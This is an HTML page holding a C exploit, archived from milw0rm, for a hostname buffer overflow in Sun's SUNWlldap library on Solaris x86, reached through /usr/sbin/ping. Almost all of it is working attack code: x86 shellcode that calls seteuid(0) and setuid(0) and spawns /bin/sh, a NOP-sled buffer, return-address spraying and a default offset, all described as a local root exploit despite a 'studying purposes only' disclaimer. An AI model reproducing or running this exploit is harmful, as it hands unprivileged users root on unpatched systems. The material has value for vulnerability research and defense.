<html><head><title>Sun SUNWlldap Library Hostname Buffer Overflow Exploit
</title></head><pre>/***********************************************************
* hoagie_solarisldap.c
*
* gcc hoagie_solarisldap.c -o hoagie_solarisldap
*
* Author: Andi &lt;andi@void.at&gt;
*
* Greetz to Greuff, philipp and the other hoagie-fellas :-)
*
* THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
* CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
* DAMAGE DONE USING THIS PROGRAM.
*
*
* Offsets: 9208 ... without patch 108994-11
*
************************************************************/

#include &lt;stdio.h&gt;

#define NOP 0x90
#define ORIGSIZE 258

char shellcode[]=
/* main: */
&quot;\xeb\x0a&quot; /* jmp initcall */

/* initlcall: */
&quot;\x9a\x01\x02\x03\x5c\x07\x04&quot; /* lcall */
&quot;\xc3&quot; /* ret */

/* jmpz: */
&quot;\xeb\x05&quot; /* jmp setuidcode */

/* initcall: */
&quot;\xe8\xf9\xff\xff\xff&quot; /* call jmpz */

/* setuidcode: */
&quot;\x5e&quot; /* popl %esi */
&quot;\x29\xc0&quot; /* subl %eax, %eax */
&quot;\x88\x46\xf7&quot; /* movb %al, 0xfffffff7(%esi) */
&quot;\x89\x46\xf2&quot; /* movl %eax, 0xfffffff2(%esi) */

/* seteuid(0); */
&quot;\x50&quot; /* pushl %eax */
&quot;\xb0\x8d&quot; /* movb $0x8d, %al */
&quot;\xe8\xe0\xff\xff\xff&quot; /* call initlcall */
/* setuid(0); */
&quot;\x29\xc0&quot; /* subl %eax, %eax */
&quot;\x50&quot; /* pushl %eax */
&quot;\xb0\x17&quot; /* movb $0x17, %al */
&quot;\xe8\xd6\xff\xff\xff&quot; /* call initlcall */

&quot;\xeb\x1f&quot; /* jmp callz */

/* start: */
/* execve /bin/sh */
&quot;\x5e&quot; /* popl %esi */
&quot;\x8d\x1e&quot; /* leal (%esi), %ebx */
&quot;\x89\x5e\x0b&quot; /* movl %ebx, 0x0b(%esi) */
&quot;\x29\xc0&quot; /* subl %eax, %eax */
&quot;\x88\x46\x19&quot; /* movb %al, 0x19(%esi) */
&quot;\x89\x46\x14&quot; /* movl %eax, 0x14(%esi) */
&quot;\x89\x46\x0f&quot; /* movl %eax, 0x0f(%esi) */
&quot;\x89\x46\x07&quot; /* movl %eax, 0x07(%esi) */
&quot;\xb0\x3b&quot; /* movb $0x3b, %al */
&quot;\x8d\x4e\x0b&quot; /* leal 0x0b(%esi), %ecx */
&quot;\x51&quot; /* pushl %ecx */
&quot;\x51&quot; /* pushl %ecx */
&quot;\x53&quot; /* pushl %ebx */
&quot;\x50&quot; /* pushl %eax */
&quot;\xeb\x18&quot; /* jmp lcall */

/* callz: */
&quot;\xe8\xdc\xff\xff\xff&quot; /* call start */

&quot;\x2f\x62\x69\x6e\x2f\x73\x68&quot; /* /bin/sh */
&quot;\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03&quot;

/* lcall: */
&quot;\x9a\x04\x04\x04\x04\x07\x04&quot;; /* lcall */



unsigned long getsp(void)
{
__asm__(&quot; movl %esp,%eax &quot;);
}

int main(int argc, char **argv) {
char buf[512];
int offset = 9208;
int retaddr = 0;
int i;

if (argc &gt; 1) {
sscanf(argv[1], &quot;%d&quot;, &amp;offset);
}

printf(&quot;hoagie_solarisldap local root exploit\n&quot;);
printf(&quot;[*] offset: 0x%x\n&quot;, offset);

memset(buf, NOP, sizeof(buf));
buf[28] = 0xeb;
buf[29] = 30;
for (i = 0; i &lt; strlen(shellcode); i++) {
buf[i + 60] = shellcode[i];
}

retaddr = getsp() - offset;
printf(&quot;[*] return address: 0x%x\n&quot;, retaddr);

for (i = 0; i &lt; 4 * 25; i += 4){
buf[i + ORIGSIZE + 2] = retaddr &amp; 0xff;
buf[i + ORIGSIZE + 3] = (retaddr &gt;&gt; 8 ) &amp;0xff;
buf[i + ORIGSIZE + 0] = (retaddr &gt;&gt; 16 ) &amp;0xff;
buf[i + ORIGSIZE + 1] = (retaddr &gt;&gt; 24 ) &amp;0xff;
}

execl(&quot;/usr/sbin/ping&quot;, &quot;ping&quot;, buf, NULL);
}


// milw0rm.com [2003-04-01]</pre></html>